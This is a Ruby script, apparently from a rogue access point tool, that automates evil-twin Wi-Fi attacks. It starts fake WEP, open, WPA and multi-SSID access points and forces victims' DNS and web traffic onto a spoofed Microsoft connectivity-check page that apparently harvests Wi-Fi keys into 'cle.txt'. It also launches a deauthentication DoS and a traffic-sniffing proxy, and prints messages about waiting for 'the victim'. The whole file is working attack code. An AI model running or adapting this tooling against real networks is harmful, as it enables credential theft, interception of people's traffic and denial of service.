#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require 'monitor'
require 'shellwords'
require './dos'







class Rogue
   def self.airbaseWep
load 'wep.rb'
      puts "\e[1;32m[*] Starting airbase-ng as a WEP network.\e[0m"
      system "airmon-ng start #{$carte}"
sleep 5
      system "airbase-ng -c #{$canal} --essid #{"#$ssid ".shellescape} -N -W 1 #{$carte}mon &"
sleep 5
system "x-terminal-emulator -e airodump-ng -c #{$canal} -d #{$mac} -w hirte #{$carte}mon"
sleep 4
      puts "\e[1;94m[*] Waiting for the victim...\e[0m"
load 'accessdos.rb'
puts "Starting your second wifi-card..."
system "airmon-ng start #{$cartedos}"
sleep 5
puts "\e[1;94m[*] DoS will start now...\e[0m"
dos = Thread.new { `bash rundos.sh` }
   end


   def self.airbaseOpen
load 'check.rb'
      `rm -rf /etc/dhcp/dhcpd.conf`
      `touch /etc/dhcp/dhcpd.conf`
      `touch /tmp/dns.conf`
sleep 1
`cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface at0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
EOF`
sleep 1
`cat <<-EOF > /tmp/dns.conf
10.0.0.1 *.*
EOF`
sleep 1
      puts "\e[1;32m[*] Starting airbase-ng as a open network.\e[0m"
      system "airmon-ng start #{$carte}"
sleep 5
      system "airbase-ng -P -C 30 -c #{$canal} --essid #{"#$ssid ".shellescape}  > airbase.txt #{$carte}mon &"
sleep 5
Airbase.airbaseInit
     end


   def self.hostapdNormal
load 'check.rb'
      `rm -rf /etc/dhcp/dhcpd.conf`
      `touch /etc/dhcp/dhcpd.conf`
      `touch /tmp/hostapd.psk`
      `touch /tmp/hostapd.conf`
      `touch /tmp/dns.conf`
sleep 1
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=#{$ssid} 
ieee8021x=1
wpa=2
hw_mode=g
ieee80211n=1
channel=#{$canal}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_passphrase=12345678
wpa_psk_file=/tmp/hostapd.psk
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF`
sleep 2
`cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
EOF`
sleep 1
`cat <<-EOF > /tmp/dns.conf
10.0.0.1 *.*
EOF`
sleep 1   
        system "hostapd /tmp/hostapd.conf &> /dev/null &"
sleep 5
hostapdcli = Thread.new do
  while true
    system "xterm -e hostapd_cli wps_pbc"   # On lance hostapd_cli wps_pbc en tant que thread
sleep(120)     # Temps avant la relance de la commande
  end
end
Setup.hostapdInit # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end


   def self.internetGratuit
load 'inet.rb'
      `rm -rf /etc/dhcp/dhcpd.conf`
      `touch /etc/dhcp/dhcpd.conf`
sleep 1
`cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 10.0.0.0 netmask 255.255.255.0 {
interface at0;
range 10.0.0.2 10.0.0.10;
option routers 10.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 10.0.0.1;
allow unknown-clients;
}
EOF`
sleep 1
puts "\e[1;32m[*] Starting airbase-ng as a open network with internet to sniff traffic.\e[0m"
      system "airmon-ng start #{$carte}"
sleep 5
      system "airbase-ng -P -C 30 -c #{$canal} --essid #{"#$ssid ".shellescape}  #{$carte}mon &"
sleep 5
puts "\e[1;94m[*] Configuring at0...\e[0m"
`iptables --flush`
`iptables --table nat --flush`
`iptables --delete-chain`
`iptables --table nat --delete-chain`
sleep 2
`dhclient #{$cartenet}`
sleep 5
`ifconfig at0 up`
         pid = spawn('dhcpd -d /etc/dhcpd.conf')
sleep 3 
         `sudo sysctl net.ipv4.ip_forward=1`
         `sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0`
sleep 1
         `iptables -F`
         `iptables -X`
         `iptables -t nat -F`
         `iptables -t nat -X`
sleep 2
         `iptables --table nat --append POSTROUTING --out-interface #{$cartenet} -j MASQUERADE`
         `iptables --append FORWARD --in-interface at0 -j ACCEPT`
         `iptables -t nat -A PREROUTING -p udp -j DNAT --to #{$passerelle}`
         `iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:10000 &> /dev/null`
         `iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 10.0.0.1:10000`
         sleep 2;
         sergio = spawn('sergio-proxy-master -l 10000 -w /tmp/sergio-log.txt')
        sleep 3;
puts "\e[1;94m[*] Rogue AP with internet configured... waiting for victim...\e[0m"
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1
load 'accessdos.rb'
puts "Starting your second wifi-card..."
system "airmon-ng start #{$cartedos}"
sleep 5
puts "\e[1;94m[*] DoS will start now...\e[0m"
dos = Thread.new { `bash rundos.sh` }
     end


  def self.hostapdMulti
load 'check.rb'
      `rm -rf /etc/dhcp/dhcpd.conf`
      `touch /etc/dhcp/dhcpd.conf`
      `touch /tmp/hostapd.psk`
      `touch /tmp/hostapd.conf`
      `touch /tmp/dns.conf`
sleep 1
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=#{$ssid} 
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=12345678                         
wpa_psk_file=/tmp/hostapd.psk
hw_mode=g
ieee80211n=1
wmm_enabled=1
channel=#{$canal}
country_code=FR
ieee8021x=1
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
# 2e AP
bss=wlan1
ssid=#{$ssid}-5GHz
auth_algs=1           
wpa=2    
wpa_key_mgmt=WPA-PSK 
rsn_pairwise=TKIP CCMP
wpa_passphrase=onsenfou
wpa_psk_file=/tmp/hostapd.psk
hw_mode=g
ieee80211n=1
wmm_enabled=1
channel=#{$canal}
country_code=FR
ieee8021x=1
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
# 3e AP
bss=wlan2
ssid=#{$ssid}-Identification
channel=#{$canal}
EOF`
sleep 3
`cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
subnet 178.0.0.0 netmask 255.255.255.0 {
interface wlan1;
range 178.0.0.2 178.0.0.10;
option routers 178.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 178.0.0.1;
allow unknown-clients;
}
subnet 172.0.0.0 netmask 255.255.255.0 {
interface wlan2;
range 172.0.0.2 172.0.0.10;
option routers 172.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 172.0.0.1;
allow unknown-clients;
}
EOF`
sleep 2
`cat <<-EOF > /tmp/dns.conf
10.0.0.1 *.*
EOF`
sleep 1   
        system "hostapd /tmp/hostapd.conf &> /dev/null &"
sleep 5
hostapdcli = Thread.new do
  while true
    system "xterm -e hostapd_cli wps_pbc"   # On lance hostapd_cli wps_pbc en tant que thread
sleep(120)     # Temps avant la relance de la commande
  end
end
Multi.hostapdCombo # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end
      


def self.hostapdFreeradius
load 'freerad.rb'
`touch /tmp/hostapd.conf`
`touch /tmp/hostapd.psk`
sleep 1
`cat <<-EOF > /tmp/hostapd.conf
interface=#{$carte}
driver=nl80211
ssid=#{$ssid} 
logger_stdout=-1
logger_stdout_level=0
dump_file=/tmp/hostapd.dump
ieee8021x=1
eapol_key_index_workaround=0
own_ip_addr=127.0.0.1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=123456789
wpa=1
hw_mode=g
channel=#{$canal}
wpa_pairwise=TKIP CCMP
wpa_key_mgmt=WPA-EAP
EOF`
sleep 1
        puts "\e[1;32m[*] Starting hostapd and freeradius...\e[0m"
pid = spawn('/etc/init.d/freeradius start')
sleep 3;
system "hostapd -K /tmp/hostapd.conf &> /dev/null &"
sleep 5;
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1
Setup.interface
   end
end




class Setup
def self.hostapdInit
puts "\e[1;94m[*] Configuring hostapd interface...\e[0m"
`ifconfig wlan0 up`
`sudo sysctl net.ipv4.ip_forward=1`
`ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
`ifconfig wlan0 mtu 1400`
`iptables --flush`
`iptables --table nat --flush`
`iptables --delete-chain`
`iptables --table nat --delete-chain`
sleep 2;
`route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null`
`iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 175.0.0.1`
`iptables -P FORWARD ACCEPT`
`iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 175.0.0.1:80`
sleep 1
piddhcp = spawn('dhcpd -d /etc/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3;
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:www-data /var/www/*`
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Rogue started... waiting for the target victim and launching the DoS\e[0m"
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1
Setup.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Rogue started and configured... waiting for the target victim and launching the DoS\e[0m"
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1 
Setup.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end

class Multi
def self.hostapdCombo
load 'combopage.rb'
puts "Configuting the multi AP's..."
`ifconfig wlan0 up`
`sudo sysctl net.ipv4.ip_forward=1`
         `sudo ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1`
         `ifconfig wlan1 up`
         `sudo ifconfig wlan1 178.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 178.0.0.0 netmask 255.255.255.0 gw 178.0.0.1`
         `sudo ifconfig wlan2 up`
         `sudo ifconfig wlan2 172.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 172.0.0.0 netmask 255.255.255.0 gw 172.0.0.1`
         sleep 1
         `iptables --flush`
         `iptables --table nat --flush`
         `iptables --delete-chain`
         `iptables --table nat --delete-chain`
         sleep 2
         `iptables -A FORWARD -i wlan0 -o wlan2 -m state --state ESTABLISHED,RELATED \
 -j ACCEPT`
  `iptables -A FORWARD -i wlan1 -o wlan2 -m state --state ESTABLISHED,RELATED \
 -j ACCEPT`
  `iptables -A FORWARD -i wlan2 -o wlan1 -m state --state ESTABLISHED,RELATED \
 -j ACCEPT`
  `iptables -t nat -A POSTROUTING -o wlan0 -j SNAT --to 175.0.0.1`
         sleep 2
         piddhcp = spawn('dhcpd -d /etc/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
piddnsspoof = spawn('dnsspoof -i wlan1 &')
sleep 1
piddnsspooftrois = spawn('dnsspoof -i wlan2 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:www-data /var/www/*`
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Rogue started... waiting for the target victim and launching the DoS\e[0m"
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1 
Setup.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Rogue started and configured... waiting for the target victim and launching the DoS\e[0m"
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1 
Setup.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end

class Airbase
def self.airbaseInit
puts "\e[1;94m[*] Configuring at0...\e[0m"
`ifconfig at0 up`
`sudo sysctl net.ipv4.ip_forward=1`
`ifconfig at0 175.0.0.1 netmask 255.255.255.0`
`ifconfig at0 mtu 1400`
`iptables --flush`
`iptables --table nat --flush`
`iptables --delete-chain`
`iptables --table nat --delete-chain`
sleep 2
`route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null`
`iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 175.0.0.1`
`iptables -P FORWARD ACCEPT`
`iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 175.0.0.1:80`
sleep 1
piddhcp = spawn('dhcpd -d /etc/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i at0 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest`
sleep 3
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`mv #{$page}.php index.php`
`chown -R root:www-data /var/www/*`
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/msftconnecttest/cle.txt`
`chmod 764 /var/www/msftconnecttest/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Airbase started... waiting for the target victim and launching the DoS\e[0m"
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1 
Airbasedos.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Airbase started... waiting for the target victim and launching the DoS\e[0m"
Dir.chdir '/tmp/hostbase-1.1EN'
sleep 1 
Airbasedos.interface    # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end
